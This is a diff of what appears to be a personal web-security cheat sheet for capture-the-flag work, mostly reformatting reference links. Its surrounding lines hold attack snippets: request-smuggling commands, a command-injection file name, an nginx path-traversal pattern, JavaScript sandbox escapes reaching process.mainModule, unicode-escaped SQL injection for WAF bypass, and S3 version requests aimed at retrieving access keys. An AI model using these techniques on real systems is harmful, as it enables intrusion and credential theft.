@@ -1,15 +1,15 @@
 # +
 
-./javascript.md
-./fuzzing.md
+- ./javascript.md
+- ./fuzzing.md
 
-https://github.com/swisskyrepo/PayloadsAllTheThings
+- https://github.com/swisskyrepo/PayloadsAllTheThings
 
-https://portswigger-labs.net/hackability/inspector/index.php?input=window
-[HTML Codes \- Table of ascii characters and symbols](https://ascii.cl/htmlcodes.htm)
-[Unicode/UTF\-8\-character table](https://utf8-chartable.de/unicode-utf8-table.pl)
+- https://portswigger-labs.net/hackability/inspector/index.php?input=window
+- [HTML Codes \- Table of ascii characters and symbols](https://ascii.cl/htmlcodes.htm)
+- [Unicode/UTF\-8\-character table](https://utf8-chartable.de/unicode-utf8-table.pl)
 
-https://snyk.io/vuln/
+- https://snyk.io/vuln/
 
 # information disclosure
 
@@ -34,6 +34,7 @@ if _name__ == "__main__":
     - e.g. `user-agent curl/7.19.3` => vulnerable version
         - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/let_mee_see.txt
 - trailing headers - sent after the content with a zero length chunk
+    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Trailer
     ```bash
     curl -k -v -H 'TE: trailers' 'https://foo'
     # ||
@@ -42,7 +43,6 @@ if _name__ == "__main__":
     printf 'GET / HTTP/1.1\r\nHost: www.foo.com\r\n\r\n' \
         | openssl s_client -ign_eof -connect foo.com:443 -servername www.foo.com
     ```
-    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Trailer
 - page source based on login state
     - anonymous user
     - logged in user
@@ -248,8 +248,8 @@ sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~
 ~/code/snippets/ctf/web/request_smuggling_cl_cl.txt
 ```
 
-https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
-https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/
+- https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
+- https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/
 
 ### Upgrade protocol
 
@@ -515,11 +515,11 @@ filename="'$(sleep 5)'a.gif"
 nginx:
 
 - /etc/nginx/sites-enabled/default
+    - https://github.com/Toboxos/ctf-writeups/blob/main/HackTheVote2020/Dotlocker1.md
+    - https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
     ```
     location ^~ /static => /static../foo
     ```
-    - https://github.com/Toboxos/ctf-writeups/blob/main/HackTheVote2020/Dotlocker1.md
-    - https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
 
 # Side Channels
 
@@ -539,11 +539,12 @@ nginx:
 - `__defineGetter__`
     - https://hack.more.systems/writeup/2014/10/26/hacklu2014-objection/
 - alternative for `()`
+    - https://portswigger.net/research/javascript
     ```javascript
     alert`1337`in``.sub﻿in''instanceof""
     ```
-    - https://portswigger.net/research/javascript
 - alternative for function call
+    - https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/
     ```javascript
     window["a"]()
     window["a"].apply(null, [1, 2, 3])
@@ -553,7 +554,7 @@ nginx:
     (o=>o.constructor.constructor(
         o.constructor.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101))())(Math+1)
     ```
-    - https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/
+    - [CTFtime\.org / Hack\.lu CTF 2020 / BabyJS](https://ctftime.org/task/13520)
     ```
     > y
     'constructor'
@@ -571,7 +572,6 @@ nginx:
     foo
     undefined
     ```
-    - [CTFtime\.org / Hack\.lu CTF 2020 / BabyJS](https://ctftime.org/task/13520)
 - Object.freeze() is shallow
     ```javascript
     Object.freeze(Math);
@@ -581,13 +581,13 @@ nginx:
     - https://github.com/ExTi0p/ctf/tree/master/2020/FwordCTF_2020/Jailoo_Warmup
     - https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/
 - Content-Type, multipart parsing
+    - https://github.com/BlackFan/content-type-research
+    - https://soroush.secproject.com/blog/2018/08/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour/
+    - https://blog.doyensec.com/2020/08/20/playframework-csrf-bypass.html
     ```
     Content-Type: application/x-www-form-urlencoded;/json
     {"q":"' \u0075nion \u0073elect '1"}
     ```
-    - https://github.com/BlackFan/content-type-research
-    - https://soroush.secproject.com/blog/2018/08/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour/
-    - https://blog.doyensec.com/2020/08/20/playframework-csrf-bypass.html
 - HTTP Path Normalization, IDNA
     ```
     http://nginx：80/flag.php
@@ -638,20 +638,20 @@ done 2>/dev/null | vim -
 
 # wasm
 
-https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/
-https://klatz.co/ctf-blog/boilerctf-alien-tech
+- https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/
+- https://klatz.co/ctf-blog/boilerctf-alien-tech
 
 # aws
 
-```bash
-# take aws domain name
-dig foo
-# take version id header
-curl -v 'http://foo.s3-website-us-east-1.amazonaws.com/bar'
-# take version id
-curl -v 'https://foo.s3.amazonaws.com/?versions&prefix=bar'
-# take access keys
-curl -v 'https://foo.s3.amazonaws.com/bar?versionId=zcoAvy97sFgFdR08.kypq1KyLj9iZuAD'
-aws s3api get-object --bucket foo --key bar bar
-```
-    - https://0day.work/balccon2k20-ctf-let-me-see-and-dawsonite-writeups/
+- https://0day.work/balccon2k20-ctf-let-me-see-and-dawsonite-writeups/
+    ```bash
+    # take aws domain name
+    dig foo
+    # take version id header
+    curl -v 'http://foo.s3-website-us-east-1.amazonaws.com/bar'
+    # take version id
+    curl -v 'https://foo.s3.amazonaws.com/?versions&prefix=bar'
+    # take access keys
+    curl -v 'https://foo.s3.amazonaws.com/bar?versionId=zcoAvy97sFgFdR08.kypq1KyLj9iZuAD'
+    aws s3api get-object --bucket foo --key bar bar
+    ```
